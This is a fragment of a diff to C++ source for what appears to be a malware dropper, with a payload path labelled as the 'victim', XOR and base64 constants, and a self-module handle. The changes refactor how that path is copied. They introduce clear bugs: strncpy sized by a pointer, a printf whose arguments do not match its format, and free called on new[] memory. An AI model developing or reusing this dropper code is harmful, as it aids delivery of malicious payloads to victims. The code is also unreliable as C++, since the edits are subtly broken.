@@ -62,19 +62,16 @@ void set_name();
 char name[10 * NAME_SIZE];
 
 // (char*) C:\\example\\path\\to\\your\\payload.exe
-std::filesystem::path relative_file_path_name = std::filesystem::absolute(DROPPER_OUTPUT);
-
-std::string absolute_victim_name = relative_file_path_name.string();
+std::string absolute_victim_name = std::filesystem::absolute(DROPPER_OUTPUT).string();
 
 char* victim_name = new char[absolute_victim_name.size() + 1];
-
-strcpy(victim_name, absolute_victim_name.c_str());
 
 // Entry Point
 int main(int argc, char* argv[])
 {
+	strncpy(victim_name, absolute_victim_name.c_str(), sizeof(victim_name));
 
-	printf("The xor key is: %d. The base64 is: %d\n", DROPPER_XOR_KEY, DROPPER_BASE64);
+	printf("The absolute file path of the victim name is: %s. The xor key is: %d. The base64 is: %d\n", DROPPER_XOR_KEY, DROPPER_BASE64);
 
 	// Handle to myself
 	HMODULE h = GetModuleHandle(NULL);
@@ -109,6 +106,8 @@ int main(int argc, char* argv[])
 	dead();
 #endif
 	// exit without waiting child process
+
+	free(victim_name);
 	return 0;
 }
 
